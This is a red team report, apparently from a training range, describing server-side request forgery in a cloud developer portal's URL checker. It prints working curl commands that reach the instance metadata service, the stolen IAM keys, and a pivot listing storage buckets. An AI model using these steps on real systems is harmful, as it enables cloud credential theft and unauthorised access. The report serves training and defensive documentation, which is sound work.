# Red Team Report — CLD01-M01
## PUL Cloud Developer Portal — SSRF to IMDS Credential Theft
**Engagement:** Operation GRIDFALL | **Date:** 2024-11-15  
**Operator:** [Red Team Operator] | **Target:** cld-webapp (11.0.2.10)  
**Classification:** TRAINING

---

## Executive Summary

Exploited a Server-Side Request Forgery vulnerability in the portal's URL Health Checker tool to steal cloud IAM role credentials from the instance metadata service. Credentials successfully used to authenticate to downstream cloud storage (M2), initiating the full cloud zone pivot chain.

---

## Finding: SSRF via URL Health Checker (Critical)

**CWE:** CWE-918 — Server-Side Request Forgery  
**CVSS v3.1:** 8.6 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)  
**MITRE:** T1552.005, T1190

### Proof of Concept

```bash
# Authenticate
curl -sc /tmp/c.txt -X POST http://11.0.2.10:8080/login \
    -d "username=cloud-dev&password=CloudDev%40PUL2024%21" -Lo /dev/null

# Steal IAM credentials via SSRF to IMDS
curl -sb /tmp/c.txt -X POST http://11.0.2.10:8080/tools/url-check \
    --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role"
```

### Output (Credential Theft Confirmed)

```json
{
  "AccessKeyId": "AKIAPUL2024CLDSVC01",
  "SecretAccessKey": "pULcLd/S3cr3t2024/K3y!",
  "Code": "Success",
  "Type": "AWS-HMAC"
}
```

### Pivot Confirmation

```bash
export AWS_ACCESS_KEY_ID=AKIAPUL2024CLDSVC01
export AWS_SECRET_ACCESS_KEY='pULcLd/S3cr3t2024/K3y!'
aws s3 ls --endpoint-url http://11.0.2.20:9000
# 2024-11-15 10:00:00 pul-cloud-backups
# 2024-11-15 10:00:00 pul-cloud-internal
```

Pivot to M2 confirmed. Proceeding to enumerate `pul-cloud-backups` bucket.

---

## Artifacts

- `/var/log/pul-cloud/portal.log` — Contains attacker IP, timestamps, SSRF URLs
- `/var/log/pul-cloud/imds.log` — Contains IMDS hit from 127.0.0.1
- `/opt/pul-cloud-portal/app.py` — Vulnerable route at line `/tools/url-check`
